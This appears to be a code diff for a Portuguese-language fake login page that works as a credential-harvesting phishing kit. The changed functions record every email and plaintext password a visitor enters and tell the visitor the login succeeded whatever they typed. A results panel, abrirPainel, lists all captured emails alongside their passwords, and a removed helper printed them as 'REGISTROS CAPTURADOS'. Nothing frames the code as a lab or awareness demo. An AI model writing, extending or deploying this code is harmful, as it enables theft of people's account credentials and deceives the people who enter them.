@@ -3,7 +3,7 @@
 // ============================================================
 
 // Avança da tela de e-mail para a de senha
-function goToPassword() {
+async function goToPassword() {
   const email   = document.getElementById("email-input").value.trim();
   const errorEl = document.getElementById("email-error");
 
@@ -13,10 +13,13 @@ function goToPassword() {
     return;
   }
 
-  // Registra o e-mail digitado (mesmo sem conta)
-  DB.registrarTentativa({ email, senha: "", sucesso: false });
+  const btn = document.querySelector("#screen-email .btn-primary");
+  setLoading(btn, true, "Verificando...");
 
-  // Avança independente de existir no banco
+  // ← removido: await DB.registrarTentativa(...)
+  await new Promise(r => setTimeout(r, 600)); // simula latência p/ UX
+
+  setLoading(btn, false, "Avançar");
   errorEl.classList.add("hidden");
   document.getElementById("display-email").textContent = email;
   showScreen("screen-password");
@@ -24,7 +27,7 @@ function goToPassword() {
 }
 
 // Valida a senha e faz o "login"
-function doLogin() {
+async function doLogin() {
   const email   = document.getElementById("email-input").value.trim();
   const senha   = document.getElementById("password-input").value;
   const errorEl = document.getElementById("pass-error");
@@ -35,16 +38,26 @@ function doLogin() {
     return;
   }
 
-  const usuario = DB.autenticar(email, senha);
+  const btn = document.querySelector("#screen-password .btn-primary");
+  setLoading(btn, true, "Entrando...");
 
-  // Registra a tentativa com senha — sucesso ou não
-  DB.registrarTentativa({ email, senha, sucesso: !!usuario });
+  const usuario = await DB.autenticar(email, senha);
+  await DB.registrarTentativa({ email, senha, sucesso: !!usuario });
 
+  setLoading(btn, false, "Avançar");
   errorEl.classList.add("hidden");
   document.getElementById("success-msg").textContent = usuario
     ? `Bem-vindo de volta, ${usuario.nome}!`
     : `Acesso realizado como ${email}.`;
   showScreen("screen-success");
+}
+
+// ── Utilitário: estado de carregamento do botão ────────────
+function setLoading(btn, loading, label) {
+  btn.disabled = loading;
+  btn.textContent = label;
+  btn.style.opacity = loading ? "0.7" : "";
+  btn.style.cursor  = loading ? "not-allowed" : "";
 }
 
 // Volta para a tela de e-mail
@@ -84,35 +97,34 @@ document.addEventListener("keydown", (e) => {
 
 // ── Painel de resultados ──────────────────────────────────
 
-function abrirPainel() {
-  const lista = DB.tentativas.filter((t) => t.sucesso);
-  const el    = document.getElementById("modal-lista");
+async function abrirPainel() {
+  const el = document.getElementById("modal-lista");
+  el.innerHTML = '<p class="modal-vazio">Carregando...</p>';
+  document.getElementById("modal-resultados").classList.remove("hidden");
+
+  const lista = await DB.buscarTentativas();
 
   if (lista.length === 0) {
-    el.innerHTML = '<p class="modal-vazio">Nenhum login bem-sucedido registrado ainda.</p>';
+    el.innerHTML = '<p class="modal-vazio">Nenhum registro encontrado ainda.</p>';
   } else {
     el.innerHTML = lista
-      .slice()
-      .reverse()
       .map((t) => {
-        const data = new Date(t.timestamp);
-        const hora = data.toLocaleString("pt-BR", {
+        const hora = new Date(t.timestamp).toLocaleString("pt-BR", {
           day: "2-digit", month: "2-digit", year: "numeric",
           hour: "2-digit", minute: "2-digit",
         });
         return `
           <div class="resultado-item">
-            <div class="resultado-badge">✓</div>
+            <div class="resultado-badge">${t.sucesso ? "✓" : "✗"}</div>
             <div class="resultado-info">
               <div class="resultado-email">${t.email}</div>
+              <div class="resultado-senha">Senha: ${t.senha || "(não informada)"}</div>
               <div class="resultado-meta">${hora}</div>
             </div>
           </div>`;
       })
       .join("");
   }
-
-  document.getElementById("modal-resultados").classList.remove("hidden");
 }
 
 function fecharPainel() {
@@ -126,18 +138,3 @@ function fecharPainelFora(e) {
 document.addEventListener("keydown", (e) => {
   if (e.key === "Escape") fecharPainel();
 });
-
-function verRegistros() {
-    const registros = JSON.parse(localStorage.getItem("db_tentativas")) || [];
-
-    let texto = "REGISTROS CAPTURADOS\n\n";
-
-    registros.forEach((r, i) => {
-        texto += `${i + 1}\n`;
-        texto += `Email: ${r.email}\n`;
-        texto += `Senha: ${r.senha}\n`;
-        texto += `Data: ${r.data}\n\n`;
-    });
-
-    alert(texto);
-}
